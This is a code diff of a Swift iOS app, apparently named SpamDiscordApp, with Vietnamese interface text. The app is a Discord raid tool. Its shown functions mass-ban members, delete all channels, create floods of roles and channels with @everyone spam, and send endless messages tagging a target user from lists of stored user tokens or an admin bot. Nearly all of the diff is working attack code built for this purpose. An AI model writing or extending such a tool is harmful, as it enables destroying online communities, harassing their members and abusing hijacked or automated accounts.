+        log(isCancelled ? "Đã dừng" : "XONG")
+        log("=== TỔNG KẾT ===")
+        log("Ban: \(banSuccess) OK / \(banFailed) FAIL")
+        log("Xóa kênh: \(channelsDeleted)")
+        log("Tạo kênh: \(channelsCreated)")
+        log("Tin nhắn: \(messagesSent)")
+        log("Role: \(rolesCreated)")
         isNuking = false
         BackgroundManager.shared.stop()
     }
 
-    private func doMassBanScan(_ scan: UserNukeClient, clients: [UserNukeClient], gid: String, roleId: String) async {
+    private func doMassBanScan(_ scan: UserNukeClient, clients: [UserNukeClient], gid: String, options: NukeConfig) async {
         do {
             let roles = try await scan.getRoles(gid)
-            let map = Dictionary(uniqueKeysWithValues: roles.map { ($0.id, $0) })
+            let roleMap = Dictionary(uniqueKeysWithValues: roles.map { ($0.id, $0) })
             let detail = try await scan.getGuildDetail(gid)
             let ownerId = detail["owner_id"] as? String
-            let me = try await scan.validate()
-            let myMember = try await scan.getMember(gid, uid: me.id)
-            let myMax = (myMember.roles ?? []).compactMap { map[$0]?.position }.max() ?? 0
-            log("Scan token role position: \(myMax)")
+            let myUser = try await scan.validate()
+            let myM = try await scan.getMember(gid, uid: myUser.id)
+            let myMax = (myM.roles ?? []).compactMap { roleMap[$0]?.position }.max() ?? 0
+            log("  Scan role pos: \(myMax)")
 
-            var rolePos = 0
-            var filterRole = false
-            if !roleId.isEmpty, let tr = map[roleId] {
-                rolePos = tr.position; filterRole = true
-                log("Ban theo role: \(tr.name) (pos \(rolePos))")
+            var rolePosition = 0
+            var filterByRole = false
+            if !options.banRoleId.isEmpty, let tr = roleMap[options.banRoleId] {
+                rolePosition = tr.position; filterByRole = true
+                log("  Ban theo role: \(tr.name) (pos \(rolePosition))")
             }
 
             var candidates: [String] = []
             let lock = NSLock()
-            let process: ([String: Any]) -> Void = { m in
-                guard let u = m["user"] as? [String: Any], let uid = u["id"] as? String else { return }
-                if uid == me.id || uid == ownerId { return }
-                if (u["bot"] as? Bool) == true { return }
-                let mRoles = m["roles"] as? [String] ?? []
-                let mMax = mRoles.compactMap { map[$0]?.position }.max() ?? 0
-                if mMax >= myMax { return }
-                if filterRole {
-                    if !mRoles.contains(roleId) { return }
-                    if mRoles.compactMap({ map[$0]?.position }).contains(where: { $0 > rolePos }) { return }
-                }
-                lock.lock(); candidates.append(uid); let n = candidates.count; lock.unlock()
-                if n % 5 == 0 { Task { @MainActor in self.membersScanned = n } }
+
+            log("  Đang quét WS...")
+            do {
+                try await scan.fetchMembersWS(guildId: gid, onMember: { m in
+                    guard let u = m["user"] as? [String: Any], let uid = u["id"] as? String else { return }
+                    if uid == myUser.id || uid == ownerId || (u["bot"] as? Bool) == true { return }
+                    let mr = m["roles"] as? [String] ?? []
+                    let mm = mr.compactMap { roleMap[$0]?.position }.max() ?? 0
+                    if mm >= myMax { return }
+                    if filterByRole {
+                        if !mr.contains(options.banRoleId) { return }
+                        if mr.compactMap({ roleMap[$0]?.position }).contains(where: { $0 > rolePosition }) { return }
+                    }
+                    lock.lock(); candidates.append(uid); let n = candidates.count; lock.unlock()
+                    if n % 5 == 0 { Task { @MainActor in self.membersScanned = n } }
+                }, onProgress: { c in Task { @MainActor in self.membersScanned = c } })
+            } catch {
+                log("  WS lỗi: \(error.localizedDescription) — thử HTTP")
+                await scan.fetchMembersHTTP(guildId: gid, onMember: { m in
+                    guard let u = m["user"] as? [String: Any], let uid = u["id"] as? String else { return }
+                    if uid == myUser.id || uid == ownerId || (u["bot"] as? Bool) == true { return }
+                    let mr = m["roles"] as? [String] ?? []
+                    let mm = mr.compactMap { roleMap[$0]?.position }.max() ?? 0
+                    if mm >= myMax { return }
+                    if filterByRole {
+                        if !mr.contains(options.banRoleId) { return }
+                        if mr.compactMap({ roleMap[$0]?.position }).contains(where: { $0 > rolePosition }) { return }
+                    }
+                    lock.lock(); candidates.append(uid); lock.unlock()
+                }, onProgress: { c in Task { @MainActor in self.membersScanned = c } })
             }
 
-            log("Đang quét member qua WebSocket...")
-            do {
-                try await scan.fetchMembersWS(guildId: gid, onMember: process,
-                                              onProgress: { c in Task { @MainActor in self.membersScanned = c } })
-            } catch {
-                log("[LỖI] WS: \(error.localizedDescription) — thử HTTP")
-                await scan.fetchMembersHTTP(guildId: gid, onMember: process,
-                                            onProgress: { c in Task { @MainActor in self.membersScanned = c } })
-            }
-            log("Tìm thấy \(candidates.count) target")
-            guard !candidates.isEmpty else { log("Không có ai để ban"); return }
+            log("  Tìm thấy \(candidates.count) target")
+            guard !candidates.isEmpty else { log("  Không có ai để ban"); return }
 
             let queue = candidates
-            let idx = IndexBox()
-            // ✅ FIX: cache flag thread-safe trước withTaskGroup
-            let flag = self.cancelFlag
+            let idxBox = IndexBox()
+            let delay = options.banDelay
             await withTaskGroup(of: Void.self) { group in
-                for c in clients {
+                for client in clients {
                     group.addTask {
-                        while !flag.isSet {
-                            let i = idx.next()
+                        while !self.isCancelled {
+                            let i = idxBox.next()
                             if i >= queue.count { break }
                             let uid = queue[i]
+                            if delay > 0 { try? await Task.sleep(nanoseconds: UInt64(delay * 1_000_000_000)) }
                             do {
-                                try await c.banMember(gid, uid: uid)
+                                try await client.banMember(gid, uid: uid)
                                 await MainActor.run { self.banSuccess += 1 }
-                            } catch {
-                                await MainActor.run { self.banFailed += 1 }
-                            }
+                            } catch { await MainActor.run { self.banFailed += 1 } }
                         }
                     }
                 }
             }
-            log("[OK] Ban: \(banSuccess) ok / \(banFailed) fail")
-        } catch { log("[LỖI] \(error.localizedDescription)") }
+            log("  Ban xong: \(banSuccess) OK / \(banFailed) FAIL")
+        } catch { log("  Lỗi mass ban: \(error.localizedDescription)") }
     }
 
-    private func doDeleteChannels(_ clients: [UserNukeClient], _ gid: String) async {
+    private func doDeleteChannels(_ clients: [UserNukeClient], _ gid: String, options: NukeConfig) async {
         do {
             let chans = try await clients[0].getChannels(gid)
-            log("Tìm \(chans.count) kênh")
-            let idx = IndexBox(); var n = 0
+            log("  Tìm \(chans.count) kênh")
+            let idx = IndexBox(); var count = 0
             await withTaskGroup(of: Bool.self) { group in
                 var inf = 0
                 for _ in 0..<chans.count {
-                    if cancelFlag.isSet { break }
-                    let c = clients[Int.random(in: 0..<clients.count)]
+                    if isCancelled { break }
+                    let client = clients[Int.random(in: 0..<clients.count)]
                     let i = idx.next()
                     if i >= chans.count { break }
                     let ch = chans[i]
-                    group.addTask { do { try await c.deleteChannel(ch.id); return true } catch { return false } }
+                    let d = options.deleteDelay
+                    group.addTask {
+                        if d > 0 { try? await Task.sleep(nanoseconds: UInt64(d * 1_000_000_000)) }
+                        do { try await client.deleteChannel(ch.id); return true } catch { return false }
+                    }
                     inf += 1
-                    if inf >= 10 { if let r = await group.next(), r { n += 1 }; inf -= 1 }
+                    if inf >= 10 { if let r = await group.next(), r { count += 1 }; inf -= 1 }
                 }
-                for await r in group { if r { n += 1 } }
+                for await r in group { if r { count += 1 } }
             }
-            channelsDeleted = n
-            log("[OK] Đã xóa \(n)")
-        } catch { log("[LỖI] \(error.localizedDescription)") }
+            channelsDeleted = count
+            log("  Đã xóa: \(count)")
+        } catch { log("  Lỗi: \(error.localizedDescription)") }
     }
-    private func doCreateRoles(_ clients: [UserNukeClient], _ gid: String, _ opts: NukeConfig) async -> Int {
-        var n = 0
+
+    private func doCreateRoles(_ clients: [UserNukeClient], _ gid: String, options: NukeConfig) async -> Int {
+        var count = 0
         await withTaskGroup(of: Bool.self) { group in
             var inf = 0
-            for _ in 0..<opts.roleCount {
-                if cancelFlag.isSet { break }
-                let c = clients[Int.random(in: 0..<clients.count)]
-                group.addTask { do { try await c.createRole(gid, name: opts.roleName); return true } catch { return false } }
+            for _ in 0..<options.roleCount {
+                if isCancelled { break }
+                let client = clients[Int.random(in: 0..<clients.count)]
+                let d = options.createRoleDelay
+                let n = options.roleName
+                group.addTask {
+                    if d > 0 { try? await Task.sleep(nanoseconds: UInt64(d * 1_000_000_000)) }
+                    do { try await client.createRole(gid, name: n); return true } catch { return false }
+                }
                 inf += 1
-                if inf >= 10 { if let r = await group.next(), r { n += 1 }; inf -= 1 }
+                if inf >= 10 { if let r = await group.next(), r { count += 1 }; inf -= 1 }
             }
-            for await r in group { if r { n += 1 } }
+            for await r in group { if r { count += 1 } }
         }
-        return n
+        return count
     }
-    private func doCreateChannels(_ clients: [UserNukeClient], _ gid: String, _ opts: NukeConfig) async -> (Int, Int) {
-        var cr = 0, se = 0
-        var content = opts.messageContent
-        if opts.tagEveryone && !content.contains("@everyone") { content += "\n\n@everyone" }
+
+    private func doCreateChannels(_ clients: [UserNukeClient], _ gid: String, options: NukeConfig) async -> (Int, Int) {
+        var created = 0, sent = 0
+        var content = options.messageContent
+        if options.tagEveryone && !content.contains("@everyone") { content += "\n\n@everyone" }
         await withTaskGroup(of: (Bool, Bool).self) { group in
             var inf = 0
-            for _ in 0..<opts.channelCount {
-                if cancelFlag.isSet { break }
-                let c = clients[Int.random(in: 0..<clients.count)]
+            for _ in 0..<options.channelCount {
+                if isCancelled { break }
+                let client = clients[Int.random(in: 0..<clients.count)]
+                let cd = options.createChDelay, md = options.msgDelay
+                let cn = options.channelName
                 group.addTask {
+                    if cd > 0 { try? await Task.sleep(nanoseconds: UInt64(cd * 1_000_000_000)) }
                     do {
-                        guard let ch = try await c.createChannel(gid, name: opts.channelName, openEveryone: true) else { return (false, false) }
+                        guard let chId = try await client.createChannel(gid, name: cn, openEveryone: true) else { return (false, false) }
                         if !content.trimmingCharacters(in: .whitespaces).isEmpty {
-                            do { try await c.sendMessage(ch, content: content); return (true, true) }
+                            if md > 0 { try? await Task.sleep(nanoseconds: UInt64(md * 1_000_000_000)) }
+                            do { try await client.sendMessage(chId, content: content); return (true, true) }
                             catch { return (true, false) }
                         }
                         return (true, false)
@@ -1253,43 +1228,24 @@ class UserNukeManager: ObservableObject {
                 }
                 inf += 1
                 if inf >= 8 {
-                    if let (a, b) = await group.next() { if a { cr += 1 }; if b { se += 1 } }
+                    if let (cc, ss) = await group.next() { if cc { created += 1 }; if ss { sent += 1 } }
                     inf -= 1
                 }
             }
-            for await (a, b) in group { if a { cr += 1 }; if b { se += 1 } }
+            for await (cc, ss) in group { if cc { created += 1 }; if ss { sent += 1 } }
         }
-        return (cr, se)
+        return (created, sent)
     }
 }
 
-// ==========================================
-// MARK: - THREAD-SAFE HELPERS
-// ==========================================
 final class IndexBox: @unchecked Sendable {
     private var value = 0
     private let lock = NSLock()
     func next() -> Int { lock.lock(); defer { lock.unlock() }; let v = value; value += 1; return v }
 }
 
-// ✅ FIX: CancelFlag thread-safe — dùng cho UserNukeManager
-final class CancelFlag: @unchecked Sendable {
-    private var flag = false
-    private let lock = NSLock()
-    var isSet: Bool {
-        lock.lock(); defer { lock.unlock() }
-        return flag
-    }
-    func set() {
-        lock.lock(); flag = true; lock.unlock()
-    }
-    func reset() {
-        lock.lock(); flag = false; lock.unlock()
-    }
-}
-
 // ==========================================
-// MARK: - APP ENTRY POINT
+// MARK: - APP ENTRY
 // ==========================================
 @main
 struct SpamDiscordApp: App {
@@ -1309,11 +1265,10 @@ struct SpamDiscordApp: App {
 struct MainTabView: View {
     var body: some View {
         TabView {
-            SpamView().tabItem { Text("Spam") }
-            TokenListView().tabItem { Text("Tokens") }
-            NukeTabView().tabItem { Text("Nuke") }
-        }
-        .tint(.indigo)
+            SpamView().tabItem { Label("Spam", systemImage: "paperplane.fill") }
+            TokenListView().tabItem { Label("Tokens", systemImage: "person.2.fill") }
+            NukeTabView().tabItem { Label("Nuke", systemImage: "flame.fill") }
+        }.tint(.indigo)
     }
 }
 
@@ -1325,10 +1280,7 @@ struct NukeTabView: View {
             Picker("", selection: $mode) {
                 Text("Bot").tag(Mode.bot)
                 Text("User Token").tag(Mode.user)
-            }
-            .pickerStyle(.segmented)
-            .padding(.horizontal).padding(.top, 8).padding(.bottom, 4)
-
+            }.pickerStyle(.segmented).padding(.horizontal).padding(.vertical, 6)
             if mode == .bot { BotNukeView() } else { UserNukeView() }
         }
     }
@@ -1338,77 +1290,55 @@ struct NukeTabView: View {
 // MARK: - EMPTY STATE
 // ==========================================
 struct EmptyStateView: View {
-    let title: String
-    let description: String
+    let title, systemImage, description: String
     var body: some View {
-        VStack(spacing: 12) {
-            Text(title).font(.title2.bold())
+        VStack(spacing: 15) {
+            Image(systemName: systemImage).font(.system(size: 50)).foregroundStyle(.secondary)
+            Text(title).font(.title2).bold()
             Text(description).font(.subheadline).foregroundStyle(.secondary)
                 .multilineTextAlignment(.center).padding(.horizontal)
-        }
-        .frame(maxWidth: .infinity, maxHeight: .infinity)
-        .background(Color(UIColor.systemGroupedBackground))
-    }
-}
-
-struct AvatarView: View {
-    let url: URL?
-    let initial: String
-    let size: CGFloat
-    var body: some View {
-        if let url = url {
-            AsyncImage(url: url) { img in img.resizable().scaledToFill() }
-            placeholder: {
-                Circle().fill(Color.indigo.opacity(0.15))
-                    .overlay(Text(initial).font(.headline).foregroundStyle(.indigo))
-            }
-            .frame(width: size, height: size).clipShape(Circle())
-        } else {
-            Circle().fill(Color.indigo.opacity(0.15))
-                .overlay(Text(initial).font(.headline).foregroundStyle(.indigo))
-                .frame(width: size, height: size)
-        }
+        }.frame(maxWidth: .infinity, maxHeight: .infinity).background(Color(UIColor.systemGroupedBackground))
     }
 }
 
 // ==========================================
-// MARK: - TOKEN VIEWS (spam)
+// MARK: - TOKEN VIEWS
 // ==========================================
 struct TokenListView: View {
     @EnvironmentObject var app: AppState
-    @State private var showAddSheet = false
+    @State private var showAdd = false
     @State private var showImport = false
-
     var body: some View {
         NavigationStack {
             Group {
                 if app.tokens.isEmpty {
-                    EmptyStateView(title: "Chưa có Token", description: "Thêm token để sử dụng app.")
+                    EmptyStateView(title: "Chưa có Token", systemImage: "key.slash", description: "Thêm token để bắt đầu.")
                 } else {
                     List {
                         Section(header: Text("Danh sách")) {
-                            ForEach(app.tokens) { token in
-                                Button { app.setActiveToken(token) } label: {
+                            ForEach(app.tokens) { t in
+                                Button { app.setActiveToken(t) } label: {
                                     HStack(spacing: 12) {
-                                        AvatarView(url: token.avatarURL, initial: token.initial, size: 45)
+                                        if let url = t.avatarURL {
+                                            AsyncImage(url: url) { img in img.resizable().scaledToFill() }
+                                            placeholder: { Circle().fill(Color.gray.opacity(0.3)) }
+                                                .frame(width: 45, height: 45).clipShape(Circle())
+                                        } else {
+                                            Image(systemName: "person.circle.fill").resizable()
+                                                .frame(width: 45, height: 45).foregroundStyle(.gray)
+                                        }
                                         VStack(alignment: .leading, spacing: 4) {
-                                            Text(token.username).font(.headline)
-                                            Text(token.isValid ? "Live" : "Die").font(.caption).bold()
-                                                .foregroundStyle(token.isValid ? .green : .red)
+                                            Text(t.username).font(.headline)
+                                            Text(t.isValid ? "Live" : "Die").font(.caption).bold()
+                                                .foregroundStyle(t.isValid ? .green : .red)
                                         }
                                         Spacer()
-                                        if app.activeToken?.id == token.id {
-                                            Text("ĐANG DÙNG")
-                                                .font(.caption2.bold()).foregroundStyle(.indigo)
-                                                .padding(.horizontal, 8).padding(.vertical, 3)
-                                                .background(Color.indigo.opacity(0.15)).cornerRadius(4)
+                                        if app.activeToken?.id == t.id {
+                                            Image(systemName: "checkmark.circle.fill").foregroundStyle(.indigo).font(.title3)
                                         }
                                     }.padding(.vertical, 4)
-                                }
-                                .buttonStyle(.plain)
-                                .disabled(!token.isValid)
-                            }
-                            .onDelete(perform: app.deleteToken)
+                                }.buttonStyle(.plain).disabled(!t.isValid)
+                            }.onDelete(perform: app.deleteToken)
                         }
                     }
                 }
@@ -1417,16 +1347,14 @@ struct TokenListView: View {
             .toolbar {
                 ToolbarItem(placement: .topBarTrailing) {
                     Menu {
-                        Button("Thêm bằng tay") { showAddSheet = true }
-                        Button("Nhập từ file") { showImport = true }
-                    } label: { Text("Thêm").bold() }
+                        Button("Thêm tay", systemImage: "keyboard") { showAdd = true }
+                        Button("Nhập file", systemImage: "doc.text") { showImport = true }
+                    } label: { Image(systemName: "plus.circle.fill").font(.title3) }
                 }
             }
-            .sheet(isPresented: $showAddSheet) { AddTokenSheet() }
+            .sheet(isPresented: $showAdd) { AddTokenSheet() }
             .sheet(isPresented: $showImport) {
-                DocumentPicker(contentTypes: [.item]) { url in
-                    Task { await app.addTokensFromFile(url: url) }
-                }
+                DocumentPicker(contentTypes: [.item]) { u in Task { await app.addTokensFromFile(url: u) } }
             }
             .overlay {
                 if app.isCheckingToken {
@@ -1441,13 +1369,12 @@ struct TokenListView: View {
 struct AddTokenSheet: View {
     @EnvironmentObject var app: AppState
     @Environment(\.dismiss) var dismiss
-    @State private var tokenInput = ""
-
+    @State private var input = ""
     var body: some View {
         NavigationStack {
             Form {
                 Section(header: Text("Nhập Token")) {
-                    TextField("Dán token...", text: $tokenInput)
+                    TextField("Dán token...", text: $input)
                         .autocorrectionDisabled().textInputAutocapitalization(.never)
                 }
             }
@@ -1455,8 +1382,8 @@ struct AddTokenSheet: View {
             .toolbar {
                 ToolbarItem(placement: .cancellationAction) { Button("Huỷ") { dismiss() } }
                 ToolbarItem(placement: .confirmationAction) {
-                    Button("Lưu") { Task { await app.addToken(tokenInput); dismiss() } }
-                        .disabled(tokenInput.isEmpty || app.isCheckingToken)
+                    Button("Lưu") { Task { await app.addToken(input); dismiss() } }
+                        .disabled(input.isEmpty || app.isCheckingToken)
                 }
             }
         }
@@ -1469,7 +1396,6 @@ struct AddTokenSheet: View {
 struct SpamView: View {
     @EnvironmentObject var app: AppState
     @State private var searchText = ""
-
     var filtered: [Guild] {
         searchText.isEmpty ? app.guilds : app.guilds.filter { $0.name.localizedCaseInsensitiveContains(searchText) }
     }
@@ -1477,24 +1403,17 @@ struct SpamView: View {
         NavigationStack {
             Group {
                 if app.activeToken == nil {
-                    EmptyStateView(title: "Chưa chọn Token", description: "Vào tab Tokens để thêm và chọn.")
-                } else if app.isLoading {
-                    ProgressView("Đang tải...")
-                } else {
+                    EmptyStateView(title: "Chưa chọn Token", systemImage: "exclamationmark.triangle",
+                                   description: "Vào tab Tokens để thêm.")
+                } else if app.isLoading { ProgressView("Đang tải...") }
+                else {
                     List(filtered) { g in
                         NavigationLink(value: g) {
-                            HStack(spacing: 12) {
-                                if let icon = g.icon,
-                                   let url = URL(string: "https://cdn.discordapp.com/icons/\(g.id)/\(icon).png?size=64") {
+                            HStack {
+                                if let icon = g.icon, let url = URL(string: "https://cdn.discordapp.com/icons/\(g.id)/\(icon).png?size=64") {
                                     AsyncImage(url: url) { img in img.resizable().scaledToFill() }
-                                    placeholder: { Circle().fill(.gray.opacity(0.3)) }
-                                        .frame(width: 35, height: 35).clipShape(Circle())
-                                } else {
-                                    Circle().fill(Color.secondary.opacity(0.2))
-                                        .overlay(Text(String(g.name.prefix(1)).uppercased())
-                                                    .font(.caption.bold()).foregroundStyle(.secondary))
-                                        .frame(width: 35, height: 35)
-                                }
+                                    placeholder: { Circle().fill(.gray) }.frame(width: 35, height: 35).clipShape(Circle())
+                                } else { Circle().fill(.gray.opacity(0.3)).frame(width: 35, height: 35) }
                                 Text(g.name).fontWeight(.medium)
                             }
                         }
@@ -1512,27 +1431,25 @@ struct ChannelListView: View {
     @EnvironmentObject var app: AppState
     let guild: Guild
     @State private var searchText = ""
-
-    var filteredSections: [(category: Channel?, items: [Channel])] {
+    var sections: [(category: Channel?, items: [Channel])] {
         let s = app.groupedChannels()
         if searchText.isEmpty { return s }
         return s.compactMap { sec in
-            let items = sec.items.filter { $0.displayName.localizedCaseInsensitiveContains(searchText) }
-            return items.isEmpty ? nil : (sec.category, items)
+            let f = sec.items.filter { $0.displayName.localizedCaseInsensitiveContains(searchText) }
+            return f.isEmpty ? nil : (sec.category, f)
         }
     }
-
     var body: some View {
         Group {
             if app.isLoading { ProgressView() }
             else {
                 List {
-                    ForEach(filteredSections, id: \.category?.id) { sec in
+                    ForEach(sections, id: \.category?.id) { sec in
                         Section(header: Text(sec.category?.displayName.uppercased() ?? "KHÁC").font(.caption).bold()) {
                             ForEach(sec.items) { c in
                                 NavigationLink(value: c) {
-                                    HStack(spacing: 8) {
-                                        Text(c.type == 5 ? "[LOA]" : "#").foregroundStyle(.secondary).font(.caption.bold())
+                                    HStack {
+                                        Image(systemName: c.type == 5 ? "megaphone" : "number").foregroundStyle(.secondary)
                                         Text(c.displayName)
                                     }
                                 }
@@ -1553,25 +1470,22 @@ struct SendView: View {
     @EnvironmentObject var app: AppState
     let channel: Channel
     @State private var showImport = false
-    @State private var showErrorAlert = false
-
+    @State private var showErr = false
     var body: some View {
         ScrollView {
             VStack(spacing: 16) {
                 HStack {
-                    Text("#").font(.title.bold()).foregroundStyle(.indigo)
+                    Image(systemName: "number.circle.fill").font(.title).foregroundStyle(.indigo)
                     Text(channel.displayName).font(.title2.bold())
                     Spacer()
-                }
-                .padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)
+                }.padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)
 
                 VStack(alignment: .leading, spacing: 12) {
                     Text("CẤU HÌNH").font(.caption).bold().foregroundStyle(.secondary)
                     Toggle("Tag User ID", isOn: $app.useTag).tint(.indigo)
                     if app.useTag {
-                        TextField("Nhập User ID", text: $app.targetUserId)
-                            .keyboardType(.numberPad).padding(10)
-                            .background(Color(UIColor.tertiarySystemBackground)).cornerRadius(8)
+                        TextField("User ID", text: $app.targetUserId).keyboardType(.numberPad)
+                            .padding(10).background(Color(UIColor.tertiarySystemBackground)).cornerRadius(8)
                     }
                     HStack {
                         Toggle("Thêm '>'", isOn: $app.addPrefix).tint(.indigo)
@@ -1586,78 +1500,64 @@ struct SendView: View {
                         }
                         Slider(value: $app.delaySeconds, in: 0.1...5.0, step: 0.1).tint(.indigo)
                     }
-                }
-                .padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)
+                }.padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)
 
                 VStack(alignment: .leading, spacing: 10) {
                     HStack {
                         Text("NỘI DUNG TIN NHẮN").font(.caption).bold().foregroundStyle(.secondary)
                         Spacer()
-                        Button(action: { showImport = true }) {
-                            Text("Import").font(.caption.bold())
+                        Button { showImport = true } label: {
+                            Label("Import", systemImage: "doc.badge.plus").font(.caption).bold()
                         }
                     }
                     ZStack(alignment: .topTrailing) {
                         TextEditor(text: $app.inputText)
-                            .frame(height: 100)
-                            .padding(8)
-                            .background(Color(UIColor.tertiarySystemBackground))
-                            .cornerRadius(10)
+                            .frame(height: 100).padding(8)
+                            .background(Color(UIColor.tertiarySystemBackground)).cornerRadius(10)
                             .onChange(of: app.inputText) { _ in app.parseDirectInput() }
-
                         if !app.inputText.isEmpty {
-                            Button(action: { app.inputText = ""; app.parseDirectInput() }) {
-                                Text("X").font(.caption.bold()).foregroundStyle(.secondary)
-                                    .padding(8).background(Color(UIColor.tertiarySystemBackground))
-                                    .clipShape(Circle()).padding(8)
+                            Button { app.inputText = ""; app.parseDirectInput() } label: {
+                                Image(systemName: "xmark.circle.fill").foregroundStyle(.gray).padding(12)
                             }
                         }
                     }
                     if !app.messages.isEmpty {
-                        Text("Đã nhận diện: \(app.messages.count) dòng")
-                            .font(.caption).foregroundStyle(.green)
+                        Text("Nhận diện: \(app.messages.count) dòng").font(.caption).foregroundStyle(.green)
                     }
-                }
-                .padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)
+                }.padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)
 
                 if app.isSending {
                     VStack(spacing: 12) {
-                        ProgressView().scaleEffect(1.3).tint(.indigo).padding(.top)
+                        ProgressView().scaleEffect(1.5).tint(.indigo).padding(.top)
                         Text("Đang gửi vô hạn...").font(.headline)
-                        Text("Tổng đã gửi: \(app.totalSent)").font(.subheadline).foregroundStyle(.secondary)
+                        Text("Tổng: \(app.totalSent)").font(.subheadline).foregroundStyle(.secondary)
                         Text(app.currentMessageStr).font(.caption).foregroundStyle(.gray)
                             .lineLimit(2).multilineTextAlignment(.center).padding(.horizontal)
                         if let e = app.lastError { Text(e).font(.caption).foregroundStyle(.red) }
-                        Button(action: { app.stopSending() }) {
+                        Button { app.stopSending() } label: {
                             Text("DỪNG LẠI").bold().frame(maxWidth: .infinity).padding()
                         }.background(Color.red).foregroundStyle(.white).cornerRadius(12)
                     }.padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)
                 } else {
-                    Button(action: { app.startSending(channel: channel) }) {
+                    Button { app.startSending(channel: channel) } label: {
                         Text("BẮT ĐẦU GỬI").bold().frame(maxWidth: .infinity).padding()
-                    }
-                    .background(Color.indigo).foregroundStyle(.white).cornerRadius(12)
+                    }.background(Color.indigo).foregroundStyle(.white).cornerRadius(12)
                     .disabled(app.messages.isEmpty || (app.useTag && app.targetUserId.isEmpty))
-                    .opacity((app.messages.isEmpty || (app.useTag && app.targetUserId.isEmpty)) ? 0.5 : 1.0)
+                    .opacity((app.messages.isEmpty || (app.useTag && app.targetUserId.isEmpty)) ? 0.5 : 1)
                 }
             }.padding()
         }
         .background(Color(UIColor.systemGroupedBackground))
         .navigationTitle("Gửi tin nhắn").navigationBarTitleDisplayMode(.inline)
-        .toolbar {
-            ToolbarItemGroup(placement: .keyboard) {
-                Spacer(); Button("Xong") { app.hideKeyboard() }
-            }
-        }
+        .toolbar { ToolbarItemGroup(placement: .keyboard) { Spacer(); Button("Xong") { app.hideKeyboard() } } }
         .sheet(isPresented: $showImport) {
-            DocumentPicker(contentTypes: [.item]) { url in
-                app.parseFile(url: url)
-                if app.lastError != nil { showErrorAlert = true }
+            DocumentPicker(contentTypes: [.item]) { u in
+                app.parseFile(url: u)
+                if app.lastError != nil { showErr = true }
             }
         }
-        .alert("Lỗi Import", isPresented: $showErrorAlert) {
-            Button("OK", role: .cancel) {}
-        } message: { Text(app.lastError ?? "Lỗi") }
+        .alert("Lỗi", isPresented: $showErr) { Button("OK", role: .cancel) {} }
+        message: { Text(app.lastError ?? "Lỗi") }
     }
 }
 
@@ -1667,7 +1567,6 @@ struct SendView: View {
 struct BotNukeView: View {
     @EnvironmentObject var bot: BotManager
     @State private var selectedGuild: Guild?
-
     var body: some View {
         NavigationStack {
             Group {
@@ -1683,18 +1582,18 @@ struct BotNukeView: View {
         if bot.config == nil { return "Bot Nuke" }
         if bot.isNuking { return "Đang chạy..." }
         if let g = selectedGuild { return g.name }
-        return "Bot — Chọn Server"
+        return "Chọn Server"
     }
 }
 
 struct BotSetupView: View {
     @EnvironmentObject var bot: BotManager
     @State private var tokenInput = ""
-
     var body: some View {
         ScrollView {
             VStack(spacing: 20) {
-                Text("BOT NUKE").font(.largeTitle.bold()).padding(.top, 30)
+                Image(systemName: "server.rack").font(.system(size: 60)).foregroundStyle(.red).padding(.top, 30)
+                Text("BOT NUKE").font(.largeTitle.bold())
 
                 VStack(alignment: .leading, spacing: 12) {
                     Text("BOT TOKEN").font(.caption).bold().foregroundStyle(.secondary)
@@ -1704,30 +1603,26 @@ struct BotSetupView: View {
                         .cornerRadius(10).font(.system(.body, design: .monospaced))
                     Text("Developer Portal → Applications → Bot → Reset Token")
                         .font(.caption2).foregroundStyle(.secondary)
-                }
-                .padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)
+                }.padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(15)
 
-                if let e = bot.tokenError {
-                    Text(e).font(.caption).foregroundStyle(.red).multilineTextAlignment(.center)
-                }
+                if let e = bot.tokenError { Text(e).font(.caption).foregroundStyle(.red).multilineTextAlignment(.center) }
 
-                Button(action: { Task { await bot.setToken(tokenInput) } }) {
+                Button { Task { await bot.setToken(tokenInput) } } label: {
                     HStack {
                         if bot.isCheckingToken { ProgressView().tint(.white) }
+                        else { Image(systemName: "checkmark.shield.fill") }
                         Text(bot.isCheckingToken ? "Đang kiểm tra..." : "KẾT NỐI BOT").bold()
                     }.frame(maxWidth: .infinity).padding()
-                }
-                .background(Color.red).foregroundStyle(.white).cornerRadius(12)
+                }.background(Color.red).foregroundStyle(.white).cornerRadius(12)
                 .disabled(tokenInput.isEmpty || bot.isCheckingToken)
                 .opacity(tokenInput.isEmpty ? 0.5 : 1)
 
                 VStack(alignment: .leading, spacing: 8) {
                     Text("YÊU CẦU").font(.caption).bold().foregroundStyle(.secondary)
-                    Text("- Bot đã vào server cần nuke").font(.caption)
-                    Text("- Bật Server Members Intent").font(.caption)
-                    Text("- Quyền Administrator").font(.caption)
-                }
-                .frame(maxWidth: .infinity, alignment: .leading)
+                    Label("Bot đã vào server", systemImage: "checkmark.circle")
+                    Label("Bật Server Members Intent", systemImage: "checkmark.circle")
+                    Label("Quyền Administrator", systemImage: "checkmark.circle")
+                }.font(.caption).frame(maxWidth: .infinity, alignment: .leading)
                 .padding().background(Color(UIColor.secondarySystemBackground)).cornerRadius(12)
             }.padding()
         }
@@ -1738,53 +1633,45 @@ struct BotGuildListView: View {
     @EnvironmentObject var bot: BotManager
     @Binding var selectedGuild: Guild?
     @State private var searchText = ""
-
     var filtered: [Guild] {
         searchText.isEmpty ? bot.botGuilds : bot.botGuilds.filter { $0.name.localizedCaseInsensitiveContains(searchText) }
     }
-
     var body: some View {
         VStack(spacing: 0) {
-            if let cfg = bot.config {
+            if let c = bot.config {
                 HStack(spacing: 12) {
-                    AvatarView(url: cfg.avatarURL, initial: cfg.initial, size: 42)
+                    if let url = c.avatarURL {
+                        AsyncImage(url: url) { img in img.resizable().scaledToFill() }
+                        placeholder: { Circle().fill(.gray.opacity(0.3)) }.frame(width: 42, height: 42).clipShape(Circle())
+                    } else { Image(systemName: "cpu").font(.title2).frame(width: 42, height: 42) }
                     VStack(alignment: .leading, spacing: 2) {
-                        Text(cfg.displayName).font(.subheadline.bold())
-                        Text("Bot ID: \(cfg.userId)").font(.caption2).foregroundStyle(.secondary)
